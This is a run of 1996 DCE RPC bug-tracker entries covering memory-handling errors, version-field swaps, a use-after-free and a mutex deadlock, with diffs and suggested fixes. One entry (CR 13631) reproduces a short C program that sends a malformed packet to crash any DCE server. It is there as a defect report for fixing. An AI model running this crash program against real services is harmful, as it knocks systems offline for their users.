CR Number                     : 13690
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Problem in error path in rpc_ns_import_ctx_add_eval
Reported Date                 : 12/20/96
Found in Baseline             : 1.1
Found Date                    : 12/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/20/96 public]

This defect is reported by IBM dcemvs.  Following is their description:


 prefix        d
 name          893
 reference     I18N
 abstract      Problem in error path in rpc_ns_import_ctx_add_eval
 duplicate

 state         closed
 severity      3
 age           0

 compName      rpc_runtime                 answer        program_defect
 release       mvs_r4
 envName
 level

 addDate       95/04/17 09:42:00           assignDate    95/05/01 17:34:28
 lastUpdate    96/07/31 14:41:12           responseDate  96/07/23 16:00:59
 endDate       96/07/31 14:41:12

 ownerLogin    vickip                      originLogin   vickip
 ownerName     Vicki Pritko                originName    Vicki Pritko
 ownerArea     G98                         originArea    G98

 defectOrigin    OSF11

 defectType      05I_algorithm
 defectTrigger   P01_stress
 defectSource    05_imported
 defectImpact    10_capability
 actvtyWhnFound  02_ILLD
 phaseInjected   04_CODE/UT

 aparNumber
 Level 3 Hours

 CA Required?
 CA Performed

 tracks:
     releaseName           state           addDate   lastUpdate target
     --------------------- --------------- --------- ---------- ---------------
     mvs_r4                complete        96/07/23  96/07/31

 verify:
     type            state           addDate   lastUpdate userLogin
     --------------- --------------- --------- ---------- ---------------
     original        accept          96/07/23  96/07/31   vickip

 history:
     addDate              action          userLogin (userName)
     -------------------- --------------- ----------------------------------
     95/04/17 09:42:01    open            vickip (Vicki Pritko)

     95/07/26 11:46:05    modify          vickip (Vicki Pritko)
     96/01/24 10:58:08    modify          tjh (Tim Hahn)
     96/01/24 11:18:06    modify          tjh (Tim Hahn)
     96/06/11 09:45:21    modify          vickip (Vicki Pritko)
     96/07/11 16:13:55    note            vickip (Vicki Pritko)
     96/07/23 16:00:59    accept          vickip (Vicki Pritko)
     96/07/24 14:41:22    note            vickip (Vicki Pritko)
     96/07/24 15:46:09    note            vickip (Vicki Pritko)
     96/07/24 15:47:05    modify          vickip (Vicki Pritko)
     96/07/31 13:54:19    verify          harlan (Doug Harlan)
     96/07/31 14:41:12    close           vickip (Vicki Pritko)

 duplicate defects: none.

 duplicate features: none.

 sizing: none.

 notes:
     <Note by vickip (Vicki Pritko), 95/04/17 09:42:01, action: open>
 In module cs_s_eval.c in function rpc_ns_import_ctx_add_eval,
 if the import function context has already been allocated
 and we successfully allocate a new evaluation list
 structure, but we fail when rpc_rgy_get_codesets is called,
 then the code does not clean up correctly.  Right now the
 code from OSF releases the input import function context.
 By doing this, it is releasing the pointer to the valid
 list of evaluation routines but not releasing any of the
 list.
 Either
 1.  This routine should exit without releasing the import
     function context in the case.  It should be documented
     that the client program should always call
     rpc_ns_binding_import_done to release all of the allocated
     storage.
 or
 2.  When exiting with an error in this case, we should release
     the entire list of evaluation routines and then release
     the import function context.

 Note that this change should also apply to the new RAS being
 added into the same area, when there is a problem allocating
 the new evaluation list structure.


     <Note by vickip (Vicki Pritko), 96/07/11 16:13:55, action: note>
 I looked into this defect a little more and it seems as
 though the error path was copied from a similar error
 path earlier in the code.  In the path that I describe
 above, eval_func_rep has not even been initialized at
 the point when we call RPC_MEM_FREE.  It is initialized
 after the call to rpc_rgy_get_codesets successfully
 completes.  I think that all that needs to be done
 is comment out the RPC_MEM_FREE of eval_func_rep.

     <Note by vickip (Vicki Pritko), 96/07/24 14:41:22, action: note>
 I have commented out the call and unit-tested the update.



CR Number                     : 13689
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Abend during evaluation in rpc_cs_get_tags
Reported Date                 : 12/20/96
Found in Baseline             : 1.1
Found Date                    : 12/20/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cs_s_stub.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/20/96 public]

This defect is reported by IBM MVS DCE.  The following is their description:


prefix        d
name          5248
reference     I18N
abstract      Abend during evaluation in rpc_cs_get_tags
duplicate

state         closed
severity      2
age           0

compName      rpc_runtime                 answer        program_defect
release       mvs_r4
envName
level

addDate       96/07/29 13:31:10           assignDate    96/07/29 13:33:12
lastUpdate    96/08/07 08:47:35           responseDate  96/07/29 13:33:31
endDate       96/08/07 08:47:35

ownerLogin    vickip                      originLogin   vickip
ownerName     Vicki Pritko                originName    Vicki Pritko
ownerArea     G98                         originArea    G98

defectOrigin    OSF11

defectType      04M_assignment
defectTrigger   P06_normal_mode
defectSource    05_imported
defectImpact    10_capability
actvtyWhnFound  03_ICODE
phaseInjected   03_LLD

aparNumber
Level 3 Hours

CA Required?
CA Performed

Target

tracks:
    releaseName           state           addDate   lastUpdate target
    --------------------- --------------- --------- ---------- ---------------
    mvs_r4                complete        96/07/29  96/08/06

verify:
    type            state           addDate   lastUpdate userLogin
    --------------- --------------- --------- ---------- ---------------
    original        accept          96/07/29  96/08/07   vickip

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    96/07/29 13:31:10    open            vickip (Vicki Pritko)
"5248.defect" 121 lines, 4322 characters
    96/07/29 13:33:12    assign          vickip (Vicki Pritko)
    96/07/29 13:33:31    accept          vickip (Vicki Pritko)
    96/07/29 13:39:37    note            vickip (Vicki Pritko)
    96/07/30 08:33:34    note            vickip (Vicki Pritko)
    96/07/30 08:34:11    modify          vickip (Vicki Pritko)
    96/08/06 15:06:55    verify          harlan (Doug Harlan)
    96/08/07 08:47:35    close           vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 96/07/29 13:31:10, action: open>
When using rpc_cs_get_tags to do the code set evaluation
(ie. no evaluation routines are called in the client code),
this routine abends.  The client app takes a CEE dump and
then issues the following message:
EUVR01525A The method for processing the binding handle
           conversion information for API cs_byte_net_size
           is not valid.

    <Note by vickip (Vicki Pritko), 96/07/29 13:33:12, action: assign>
Old Owner: regerkk
New Owner: vickip



    <Note by vickip (Vicki Pritko), 96/07/29 13:39:37, action: note>
I have debugged this defect as follows.

The reason the code abends is that rpc_cs_get_tags never sets
the bind_p->cs_eval.key.  Thus when cs_byte_net_size gets
called, the code will fall through to the client path and
check bind_p->cs_eval.key.  If this field is not set, then
the code will take a dump and issue the message stated
above.

The fix for this problem is to set bind_p->cs_eval.key to
RPC_CS_EVAL_TAGS before exiting rpc_cs_get_tags.



CR Number                     : 13687
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : perf test
Short Description             : Perf test needs to be TETized and added to func test suite
Reported Date                 : 12/18/96
Found in Baseline             : 1.0
Found Date                    : 12/18/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/test/rpc/runtime/perf/*
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/18/96 public]

The RPC runtime PERF test has always (since before the days of DCE) been a
manual client-server test.  As we've recently found out the hard way, this
leads to it not being run often enough and can also lead to operator error
missing problems that should have been uncovered.

The test should be TETized (via shell script wrappers would be fine) and
added as part of the automated functional test suite, since it does cover
some parts of the RPC runtime functionality that may not be covered well
enough by other automated tests.



CR Number                     : 13669
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10346
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime
Short Description             : rpc_mgmt_ep_elt_inq_next does
not ignore protocol towers
Reported Date                 : 11/14/96
Found in Baseline             : 1.1
Found Date                    : 11/14/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : comep.c
Diff supplied by              : osf
Diff release                  : 1.1
Sensitivity                   : public

[11/14/96 public]

A support customer has reported the following problem.
===========================================================

DCE Component: DCE RPC
Component: , , 
Client Hardware: 
Client Software: 
Server Hardware: 
Server Software: WinNT 4.0
Compiler: 
Severity: Enhancement
Date of First Occurrence: Today
One Line Description: rpc_mgmt_ep_elt_inq_next does not ingore protocol towers it does not understand
Full Description: While enumerating endpoints rpc_mgmt_ep_elt_inq_next returns
an error if status from rpc_tower_to_binding fails with
rpc_s_not_rpc_tower status. Because there may be endpoint
mappers ( eg: Microsoft endpoint mapper "rpcss" ) that 
support towers that OSF reference implementation fails to
understand, it is desirable that those be ignored while
enumerating.

Without this change
one can not configure DCE clients into a cell with security
server running on NT because configuration scripts
typically identify the security server object id using
'rpccp show mapping' that fails.

Repeat By: 
Proposed Solution: 
 Ignore rpc_s_not_rpc_tower error in the above context.

[1/6/97 public]

  Gradient verified the following fix works.  This fix should be
merged into DCE 1.1 Maintenance release, DCE 1.2.1 Maintenance release,
as well as DCE 1.2.2 Maintenance release (after 1.2.2 is released).
Context diff was made agaist the current DCE 1.1 Maintenance source.

% bdiff -c comep.c
./rpc/runtime/comep.c
Comparing the file in your sandbox with revision 1.1.77.1.
*** 1.1.77.1    1997/01/03 20:47:39
--- /u0/rcs_trees/dce/rcs/#odexm013076/comep.c  1997/01/06 23:44:16
***************
--- 8,13 ----
***************
*** 1159,1164 ****
--- 1156,1162 ----
               * If the conversion was ok, we have a supported tower.
               * If the tower is of an unsupported protseq, we filter it out.
               * Any other status is a problem, so return.
+            * OT13669: If the tower is not recognized, we ignore it.
               */
              if (*status == rpc_s_ok)
              {
***************
*** 1166,1172 ****
              }
              else
              {
!                 if (*status != rpc_s_protseq_not_supported)
                  {
                      return;
                  }
--- 1164,1171 ----
              }
              else
              {
!                 if ((*status != rpc_s_protseq_not_supported) &&
!                   (*status != rpc_s_not_rpc_tower))
                  {
                      return;
                  }



CR Number                     : 13659
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Pickling:  Major and Minor versions mixed in pickling.c
Reported Date                 : 10/21/96
Found in Baseline             : 1.1
Found Date                    : 10/21/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/21/96 public]

IBM CMVC defect 25076 is opened for tracking the pickling problem: 


prefix        p
name          25076
reference     
abstract      Pickling:  Major and Minor versions mixed in pickling.c
duplicate     

state         working                     priority      investigate         
severity      3                           target                            
age           28

compName      rpc.idl.src                 answer        error               
release       os2dce21                    symptom       other               
envName                                   phaseFound    osf                 
level                                     phaseInject                       

addDate       1996/09/23 11:26:14         assignDate    1996/09/24 09:59:16 
lastUpdate    1996/10/21 14:00:28         responseDate  1996/10/09 11:47:57 
endDate                                

ownerLogin    cwang                       originLogin   piers               
ownerName     Cathy Wang                  originName    Hendrie, Piers *VEND
ownerArea     AUS/lwqs                    originArea    AUS/lggs            

tracks:
    releaseName           state           addDate    lastUpdate target
    --------------------- --------------- ---------- ---------- ---------------
    aixdce21              fix             1996/10/17 1996/10/17                
    os2dce21              fix             1996/10/17 1996/10/17                

verify:
    type            state           addDate    lastUpdate userLogin       duplicate
    --------------- --------------- ---------- ---------- --------------- ---------------
    original        notReady        1996/10/09 1996/10/09 piers           25076          

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    1996/09/23 11:26:14  open            piers (Hendrie, Piers *VENDOR*)
    1996/09/24 09:59:16  assign          cwang (Cathy Wang)
    1996/09/24 16:32:26  note            piers (Hendrie, Piers *VENDOR*)
    1996/10/09 11:47:58  accept          cwang (Cathy Wang)
    1996/10/21 14:00:28  modify          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by piers (Hendrie, Piers *VENDOR*), 1996/09/23 11:26:14, action: open>
Pickeling:  Major and Minor versions mixed in pickling.c.

Comparing versions in pickling.c line 1045, the vers_major
is assumed to be in the high 16 bits of the interface version.
Looking at the idl interpreter parser code with Cathy, we can 
see that it is the vers_minor that is stored in the high 16
bits, and the vers_major is stored in the low 16 bits.

So, link 1046 and 1047 should simply have the words 'major'
and 'minor' swapped.

Problem found while writing test case for dce_server_inq_server().

    <Note by cwang (Cathy Wang), 1996/09/24 09:59:16, action: assign>
This defect may be a dup of defect 13162 which we returned because not reproducable.
Old Owner: ainswrth
New Owner: cwang



    <Note by piers (Hendrie, Piers *VENDOR*), 1996/09/24 16:32:25, action: note>
Similarly, the 'major' and 'minor' need to be swapped in function
idl_es_put_encoding_header() in pickling.c at lines 848 and 868.

    <Note by cwang (Cathy Wang), 1996/10/21 14:00:28, action: modify>
The defect is fixed, here is the diffs in src/rpc/idl/lib/pickling.c:

879c879
<     vers_field = p_if_spec->vers % 65536;   /* Major version */
---
>     vers_field = p_if_spec->vers / 65536;   /* Major version */
881c881
<     vers_field = p_if_spec->vers / 65536;   /* Minor version */
---
>     vers_field = p_if_spec->vers % 65536;   /* Minor version */
901,902d900
<                                                      = p_if_spec->vers % 65536;
<     p_es_state->IDL_pickle_header.IDL_if_id.vers_minor
903a902,903
>     p_es_state->IDL_pickle_header.IDL_if_id.vers_minor
>                                                      = p_if_spec->vers % 65536;
1077,1079c1077,1079
<             if (p_if_spec->vers !=
<                 (p_es_state->IDL_pickle_header.IDL_if_id.vers_minor * 65536
<                         + p_es_state->IDL_pickle_header.IDL_if_id.vers_major))
---
>             if (p_if_spec->vers 
>                 != (p_es_state->IDL_pickle_header.IDL_if_id.vers_major * 65536
>                         + p_es_state->IDL_pickle_header.IDL_if_id.vers_minor))

However we have decided instead of dropping the fix for IBM, we will
open an OT defect.  The reason is that by fixing it, it will cause
the incompatibility problem to back level releases.



CR Number                     : 13634
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : unique ptr causes exceptionf
Reported Date                 : 9/27/96
Found in Baseline             : 1.1
Found Date                    : 9/27/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/27/96 public]

Marco Lara at OEC reports this bug with unique pointers.

===============================================================
README
===============================================================

This example illustrates what seems to be a DCE error handling "unique"
pointers.  The enclosed IDL contains four opertaions: ok1, ok2, bad1 and bad2.
n
The simple client and server run operations "ok1" and "ok2" successfully,
but using the client to call "bad1" or "bad2" raises the exception
"16c9a103 (hex): Stub or runtime protocol error (dce / rpc)"
in the client stub api "rpc_ss_ndr_unmar_interp()".

Tests "bad1" and "bad2" fail, although the NDR buffers being passed over
the wire look correct.

Fruthermore, if the client is recompiled as a Microsoft RPC client on
Windows NT, all tests pass successfully.


This test fails when the client is run on the following platforms:

solaris  2.5  using OSF DCE 1.1
hpux    10.01 using OSF DCE 1.1
aix      4.1  using OSF DCE 1.1

the test succeeds running the client on:

windows NT 4.0 using included MSRPC



To run the test:

         #  build client and server
gmake    #  (GNU make)

sample&  #  run server


client ok1   # test operation "ok1", should succeed
client ok2   # test operation "ok2", should succeed
client bad1  # test operation "bad1", should fail rasing exception
client bad2  # test operation "bad2", should fail rasing exception

===============================================================
Makefile
===============================================================

MACHINE_FLAGS = -D_HPUX_SOURCE 
IDL =  idl -keep c_source -I.
SYS_LIBS = -ldce -lm -lc_r
CC = c89 +w1 -g 

SSRCS = sample.o sample_sstub.o samplesm.o
CSRCS = client.o sample_cstub.o
SOBJS = $(SSRCS:.c=.o)
COBJS = $(CSRCS:.c=.o)

all: sample client

.c.o:
	$(CC) -c $< $(MACHINE_FLAGS) -I.
 
sample: $(SOBJS)
	$(CC) $(LDFLAGS) -o sample -z -Wl,-Bimmediate,-Bnonfatal,-a,default,-E,+b,/lib:/usr/lib $(SOBJS) $(SYS_LIBS)

client: $(COBJS)
	$(CC) $(LDFLAGS) -o client -z -Wl,-Bimmediate,-Bnonfatal,-a,default,-E,+b,/lib:/usr/lib $(COBJS) $(SYS_LIBS)

sample.h sample_cstub.c sample_sstub.c: sample.idl sample.acf
	$(IDL) sample.idl

clean:
	rm -f *.o *_[cs]stub.c client sample sample.h core

client.o: sample.h
sample.o: sample.h
sunhsm.o: sample.h

===============================================================
sample.idl
===============================================================
 
[version(2.6)]
interface sample
{

#	ifdef WIN32
		typedef unsigned long  unsigned32;
		typedef          short signed16;
#	endif

	typedef [string, unique]    char*           tStr;
	typedef struct 
	{
                            	unsigned32      Size;
    	[unique, size_is(Size)] tStr*           Array;
	} tArray;

	typedef [string, ptr]       char*           tPtrStr;
	typedef struct 
	{
                            	unsigned32      Size;
    	[ptr, size_is(Size)]    tPtrStr*        Array;
	} tPtrArray;

	void ok1
	( 
		[in] handle_t           h,
		[out] tArray*           pData
	);

	signed16 ok2
	( 
		[in] handle_t           h,
		[out] tPtrArray*        pData
	);

	signed16 bad1
	( 
		[in] handle_t           h,
		[out] tArray*           pData
	);

	void bad2
	( 
		[in] handle_t           h,
		[out] tArray*           pData,
		[out] signed16*         j
	);
}

===============================================================
sample.acf
===============================================================

interface sample
{
[enable_allocate] ok1();
[enable_allocate] ok2();
[enable_allocate] bad1();
[enable_allocate] bad2();
}

===============================================================
client.c
===============================================================

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#	include "dceport.h"
#endif
#include "sample.h"

main(int argc, char **argv)
{
	tArray   Data;
	signed16 Result;
	int      i;
	unsigned32  j;
	handle_t    h;
	error_status_t st;
	signed16    m;

	rpc_binding_from_string_binding ((idl_char*)"ncacn_ip_tcp:localhost",
		&h, &st);
	assert (st == error_status_ok);

	for (i = 1; i < argc; i++)
	{
		memset (&Data, 0, sizeof (tArray));
		printf ("running <%s>\n", argv[i]);
		if (!strcmp (argv[i], "ok1"))
		{
			ok1 (h, &Data);
		}
		else if (!strcmp (argv[i], "ok2"))
		{
			Result = ok2 (h, (tPtrArray*)&Data);
			printf ("Result = %hu\n", Result);
		}
		else if (!strcmp (argv[i], "bad1"))
		{
			Result = bad1 (h, &Data);
			printf ("Result = %hu\n", Result);
		}
		else if (!strcmp (argv[i], "bad2"))
		{
			bad2 (h, &Data, &m);
		}
		printf ("Data = %lu\n", Data.Size);
		for (j = 0; j < Data.Size; j++)
		{
			if (Data.Array[j])
			{
				printf ("\t<%s>\n", Data.Array[j]);
			}
			else
			{
				printf ("\t<NULL>\n");
			}
		}
	}
	return 0;
}

===============================================================
sample.c
===============================================================
#include <stdio.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#	include "dceport.h"
#endif
#include "sample.h"

static void GetData
(
	tArray*       pData
)
{
	error_status_t St;

	pData->Array = rpc_sm_allocate (2 * sizeof (tStr), &St);
	pData->Size = 2;
	pData->Array[0] = rpc_sm_allocate (6, &St);
	pData->Array[1] = NULL;
	strcpy (pData->Array[0], "hello");
}

void ok1
(
	handle_t       h,
	tArray*        pData
)
{
	GetData(pData);
}

signed16 ok2
(
	handle_t       h,
	tPtrArray*     pData
)
{
	GetData((tArray*)pData);
	return 1;
}

signed16 bad1
(
	handle_t       h,
	tArray*        pData
)
{
	GetData(pData);
	return 1;
}

void bad2
(
	handle_t       h,
	tArray*        pData,
	signed16*      j
)
{
	GetData(pData);
	*j = 2;
}

===============================================================
samplesm.c
===============================================================

#include <stdio.h>
#include <assert.h>

#ifndef WIN32
#	include <dce/rpc.h>
#else
#	include <rpc.h>
#endif

#include "sample.h"


int main (int argc, char** argv)
{
	error_status_t st;
	rpc_binding_vector_t* bvec;

	rpc_server_register_if (sample_v2_6_s_ifspec, NULL, NULL, &st);
	assert (st == error_status_ok);

	rpc_server_use_all_protseqs (5,  &st);
	assert (st == error_status_ok);

	rpc_server_inq_bindings (&bvec, &st);
	assert (st == error_status_ok);

	rpc_ep_register (sample_v2_6_s_ifspec, bvec, NULL, NULL, &st);
	assert (st == error_status_ok);

	rpc_server_listen (5, &st);
	assert (st == error_status_ok);

	return 0;
}



CR Number                     : 13631
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13489
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : server-runtime
Short Description             : bad packets crash a server
Reported Date                 : 9/25/96
Found in Baseline             : 1.2.1
Found Date                    : 9/25/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/25/96 public]

Lexis-Nexis has a small program that will crash any DCE server.
I have no idea what priority to give this bug.  If you add additional
information to this OT, please note the non-project people on the Cc list.
I am also reporting this against 1.2.1 as I believe that is the basis
for the HP 1.1 product.

>    Here is the stack trace from running the client against dtsd
>on an HP (HP/UX 9.0.4 DCE 1.1):
>
>Target process died because of: SIGSEGV - segmentation violation.
>Executing image in process 2394: "/opt/dcelocal2/dcelocal/bin/dtsd".
>Stopped at: `va(40066f78) (40066F78) (`thread(22))
> 
>Thread 22 rpc__cn_network_receiver  RUNNING 
>`thread(22)\`main:  Stopped at: `va(40066f78) (40066F78)

Here is the code.

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stream.h>
#include <ctype.h>
 
 
main(int argc, char **argv)
{
   int i,j, sockfd, ntimes = 1;
   int result, serverLen;
   struct sockaddr_in serv_addr;
   struct sockaddr* serverSockAddrPtr;
   char SERV_HOST_ADDR[24];
   int portnum;
   char inbuf[80];
   char outbuf[8192];
   short int filler = 0x01;
   short int major_minor;
   short int fsize = 4096;
 
   memset((char *) &serv_addr, 0 , sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = inet_addr(SERV_HOST_ADDR);
   cout << "Enter Host: ";
   cin >> SERV_HOST_ADDR;
   cout << "Enter Port Number: ";
   cin >> portnum;
   serv_addr.sin_addr.s_addr = inet_addr(SERV_HOST_ADDR);
   serv_addr.sin_port = htons(portnum);
   serverSockAddrPtr = (struct sockaddr*) &serv_addr;
   serverLen = sizeof (serv_addr);
 
   major_minor = (0x05 << 8)  + 0x00;
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        cout << "clientsoc: can't open stream socket";
        exit(0);
     }
   do {
   result = connect(sockfd,serverSockAddrPtr,serverLen);
   if (result == -1) sleep(1);
   } while (result == -1);
 
   // kill the server
 
   write (sockfd,&major_minor,2);
   write (sockfd,&filler,2);
   write (sockfd,&fsize,2);
   memset( outbuf, '\0', 8192);
   write (sockfd,outbuf,8192);
 
   // reads not needed - only provide timing clue to client
   read (sockfd,inbuf,80);
   cout << inbuf << endl;
   close(sockfd);
   exit(0);
}

[09/26/96 public]

I opened OT 13489 when a support customer reported that bad packets 
crashed any server exporting ncadg except rpcd and dced. 

It looks like these are dup's. For now I am entering them in each other's 
inter-dependent fields.



CR Number                     : 13617
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Unexpected exception was raised
Reported Date                 : 8/25/96
Found in Baseline             : 1.1
Found Date                    : 8/25/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnclsm.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/25/96 public]

The test was terminated due to the following error:        
PID#145 rpc recv d:\U\BUILD\BUILD\SRC\RUNTIME\CNRCVR.C 466 0ax010a5010 msgID=
0x16C9A15C
[rpc__cn_network_receiver] Unexpected exception was raised


------------------------------------------------------------------------
The problem is the state machine does not realize the call rep could be
freed in stop_orphan_action_rtn.  Once the call rep is freed the state 
machine is also freed.  In rpc__cn_sm_eval_event, the state machine
control block is actually prt of the call rep memory space, therefore,
any state machine reference is actually refering to the call rep memory
space.  If the call rep is freed [in this case rpc__cn_call_end]
rpc__cn_sm_eval_event continued to use the free space of the call rep.
The trap occurs since rpc__cn_sm_eval_event checks for to determine
whether additonal events [more_events] need to be processed.
Therefore, rpc__cn_sm_eval_event will try to process the next action
using the newly freed space which will cause the resulting trap.
-------------------------------------------------------------------------
This can be fixed by copying the state machine into a local memeory and pass the replicated state into the state machine engine.
-----------------------------------------------------------------------------
Replace the definition for RPC_CN_POST_CALL_SM_EVENT in cnclsm.h with
the following:
#define RPC_CN_POST_CALL_SM_EVENT(assoc, eventid, fragbuf, st) \
{ \
    rpc_cn_call_rep_p_t crep; \
    rpc_cn_sm_ctlblk_t crep_state; \
    unsigned i; \
\
    crep = RPC_CN_ASSOC_CALL (assoc); \
    if (crep != NULL) \
    { \
        if (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep)) \
            == \
            RPC_CN_PKT_CALL_ID (RPC_CN_FRAGBUF_PKT_HDR (fragbuf))) \
        { \
            RPC_CN_CALL_SM_TRC (crep, eventid, (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep))));\
\
            if ((assoc->assoc_flags & RPC_C_CN_ASSOC_SERVER) &&  \
                (eventid == RPC_C_CALL_ORPHANED)) \
            { \
                crep_state.state_tbl = crep->call_state.state_tbl; \
                crep_state.action_tbl = crep->call_state.action_tbl; \
                crep_state.cur_state = crep->call_state.cur_state; \
                crep_state.cur_event = crep->call_state.cur_event; \
                crep_state.action_status = crep->call_state.action_status; \
                crep_state.event_list_hindex = crep->call_state.event_list_hindx; \
                crep_state.event_list_tindex = crep->call_state.event_list_tindx; \
                crep_state.event_list_state = crep->call_state.event_list_state \
                crep_state.tbl_id = crep->call_state.tbl_id; \
\
                for (i=0;i<RPC_C_CN_SM_EVENT_LIST_MAX_ENTRIES;i++) \
                        { \
                            crep_state.event_list[i].event_id = crep->call_stat.event_list[i].event_id; \
                            crep_state.event_list[i].event_param = crep->call_sate.event_list[i].event_param; \
                        } \
\                                                                               
                crep->call_state.cur_event = RPC_C_SERVER_CALL_CALL_COMPLETED; c ep->call_state.action_status = rpc_s_ok; \
\
                st = rpc__cn_sm_eval_event (eventid, (pointer_t) fragbuf, \
                     (pointer_t) crep, &(crep_state)); \
            } \
           else \
            { \
                st = rpc__cn_sm_eval_event (eventid, (pointer_t) fragbuf, \
                     (pointer_t) crep, &(crep->call_state)); \
            } \
            RPC_CN_CALL_SM_TRC_STATE (crep, (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep)))); \
        } \
        else \
        { \
            (*fragbuf->fragbuf_dealloc)(fragbuf); \
        } \
    } \
    else \
    { \
        (*fragbuf->fragbuf_dealloc)(fragbuf); \
    } \
}

[08/26/96 public]
Wouldn't a simple
                crep_state = crep->call_state;
Be a simpler replacement of all those assignments?



CR Number                     : 13616
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : possible mutex deadlock with krb_info
Reported Date                 : 8/23/96
Found in Baseline             : 1.1
Found Date                    : 8/23/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : krbdgclt.c krbclt.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/23/96 public]
In 'rpc__krb_get_tkt' and 'rpc__krb_dg_way_handler' while waiting on the the
krb_info condition if a cred_refresh is being executed in 'rpc__krb_get_tkt'.
If a cancel occurred while waiting on the condition krb_info, the thread will
hold the mutex illegally.  Protective code must be implemented to
handle cancels during the condition wait.
-------------------------------------------------------------------------------
Make the following changes in rpc__krb_dg_way_handler:
Replace the following existing statements:
    if (krb_info->auth_info.authn_level != rpc_c_authn_level_none) {

        while (krb_info->cred_fetching) {
            RPC_KRB_INFO_COND_WAIT(krb_info);
        }
With the following new statements:
    if (krb_info->auth_info.authn_level != rpc_c_authn_level_none) {
#if defined (AIX_PROD) || defined (IBMOS2) 
        st = rpc_s_ok;
        TRY
#endif
        while (krb_info->cred_fetching) {
            RPC_KRB_INFO_COND_WAIT(krb_info);
        }
#if defined (AIX_PROD) || defined (IBMOS2)
        CATCH(pthread_cancel_e)
          st = rpc_s_call_cancelled;
        ENDTRY

    if (st != rpc_s_ok)
                goto out;
#endif
-----------------------------------------------------------------------------
Make the following changes in rpc__krb_get_tkt:
Replace the existing function rpc__krb_get_tkt with the following new one:
PRIVATE unsigned32 rpc__krb_get_tkt
#ifdef _DCE_PROTO_
(
        rpc_krb_info_p_t krb_info
)
#else
